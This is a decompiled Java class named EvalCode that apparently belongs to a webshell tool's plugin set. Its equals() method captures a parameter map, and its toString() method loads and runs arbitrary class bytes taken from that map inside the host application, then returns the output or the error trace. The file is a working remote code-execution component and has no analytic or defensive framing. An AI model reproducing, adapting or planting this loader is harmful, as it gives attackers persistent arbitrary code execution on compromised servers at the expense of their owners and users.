//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package plugin;

import java.io.ByteArrayOutputStream;
import java.io.PrintStream;
import java.util.Map;

public class EvalCode extends ClassLoader {
    Map parameter;

    public EvalCode() {
    }

    public EvalCode(ClassLoader var1) {
        super(var1);
    }

    public boolean equals(Object var1) {
        if (Map.class.isInstance(var1)) {
            this.parameter = (Map) var1;
        }
        return super.equals(var1);
    }

    private String run() {
        byte[] var1 = (byte[]) this.parameter.get("classBytes");
        if (var1 != null && var1.length > 0) {
            try {
                ClassLoader var2 = this.getClass().getClassLoader();

                return (new EvalCode(var2)).defineClass((String) null, var1, 0, var1.length, this.getClass().getProtectionDomain()).newInstance().toString();
            } catch (Throwable var5) {
                ByteArrayOutputStream var3 = new ByteArrayOutputStream();
                PrintStream var4 = new PrintStream(var3);
                var5.printStackTrace(var4);
                var4.flush();
                var4.close();
                return new String(var3.toByteArray());
            }
        } else {
            return "classBytes is empty";
        }
    }

    public String toString() {
        this.parameter.put("result", this.run().getBytes());
        return super.toString();
    }
}
